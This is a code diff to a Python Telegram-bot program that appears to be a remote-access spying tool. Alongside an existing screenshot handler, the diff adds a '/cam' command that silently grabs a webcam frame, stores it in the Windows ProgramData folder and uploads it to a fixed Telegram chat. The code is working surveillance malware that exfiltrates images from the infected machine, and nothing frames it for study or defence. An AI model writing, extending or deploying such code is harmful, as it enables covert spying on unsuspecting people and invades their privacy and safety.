@@ -79,4 +79,25 @@ def send_screen(command):
 	except:
 		bot.send_photo(id_chat, 'Error')
 
+@bot.message_handler(commands=['cam'])
+def webcam(command):
+	try:
+		cap = cv2.VideoCapture(0)
+		for i in range(30):
+			cap.read()
+
+		ret, frame = cap.read()
+		cv2.imwrite(os.environ['ProgramData'] + '\\WebCam.jpg', frame)
+
+		bot.send_chat_action(id_chat, 'upload_photo')
+		cap.release()
+
+		webcam = open(os.environ['ProgramData'] + '\\WebCam.jpg', 'rb')
+		bot.send_photo(id_chat, webcam)
+		webcam.close()
+		
+	except:
+		bot.send_chat_action(id_chat, 'typing')
+		bot.send_message(id_chat, '*Webcam not found*', parse_mode="Markdown")
+		
 bot.infinity_polling()
